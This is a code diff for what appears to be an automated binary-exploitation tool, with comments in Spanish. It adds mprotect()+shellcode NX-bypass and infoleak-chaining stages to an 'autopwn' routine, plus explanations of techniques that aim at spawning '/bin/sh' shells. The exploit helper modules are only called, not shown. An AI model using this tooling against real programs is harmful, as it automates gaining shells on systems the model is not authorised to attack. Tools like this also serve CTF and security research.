@@ -194,6 +194,37 @@ def autopwn(binary: str, config=None, store=None,
         log("[combo] NX off -> shellcode en stack viable")
         learn("shellcode-stack viable (NX off)")
 
+    # combo C2: mprotect()+shellcode (NX bypass sin leak) si NX esta ON -- si esta OFF, el combo
+    # C de arriba ya cubre el caso (shellcode en stack directo, sin necesidad de ROP).
+    if (want("mprotect-shellcode") and not res.win_exploit
+            and str(mit.get("nx", "")).lower() not in ("false", "0", "nx_off")):
+        log("[combo] mprotect()+shellcode: ROP a mprotect() sobre un buffer fijo -> shellcode real...")
+        try:
+            from .autoropmprotect import autoropmprotect
+            rm = autoropmprotect(binary)
+            verdict = True if rm.get("verified") else (None if rm.get("ok") else False)
+            res.attempts.append(("mprotect-shellcode", verdict, rm.get("detail") or rm.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rm.get("verified"))
+            log(f"[combo] mprotect()+shellcode -> {'SHELL VERIFICADA' if rm.get('verified') else 'no aplicable/verificable'}")
+            learn(f"mprotect-shellcode verified={rm.get('verified')} {rm.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("mprotect-shellcode", False, str(e)))
+
+    # combo C3: infoleak chaining (un OOB read/write bug que filtra libc y lo encadena a un
+    # hijack de function-pointer -> shell, sin esperar a un bug de formato/heap especifico).
+    if want("leak-chain") and not res.win_exploit:
+        log("[combo] infoleak chaining: OOB read -> libc_base -> write-what-where -> shell...")
+        try:
+            from .autoleakchain import autoleakchain
+            rk = autoleakchain(binary)
+            verdict = True if rk.get("verified") else (None if rk.get("ok") else False)
+            res.attempts.append(("leak-chain", verdict, rk.get("detail") or rk.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rk.get("verified"))
+            log(f"[combo] infoleak chaining -> {'SHELL VERIFICADA' if rk.get('verified') else 'no aplicable/verificable'}")
+            learn(f"leak-chain verified={rk.get('verified')} {rk.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("leak-chain", False, str(e)))
+
     # combo D: format-string (verified by GOT overwrite -> shell)
     if want("format-string") and any(s in sink_names for s in ("printf", "fprintf", "snprintf")):
         log("[combo] format-string: intentando GOT overwrite -> shell (sandbox)...")
@@ -374,6 +405,10 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
         return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
     if "dlresolve" in t:
         return "dinamico no-PIE sin win()/system ni leak -> se forjan las estructuras del resolver dinamico para llamar a system('/bin/sh') SIN fuga de libc"
+    if "mprotect" in t:
+        return "NX activo, gadgets insuficientes para un execve/ret2libc completo -> ROP solo hasta mprotect() sobre un buffer fijo (RWX) y salto a shellcode real"
+    if "leak-chain" in t or "leakchain" in t:
+        return "sin win()/system directo -> un mismo bug indexable usado como leak (libc_base) y como escritura (hijack de puntero), encadenados en una sola ejecucion"
     return "seleccionada segun las defensas y primitivas observadas"
 
 
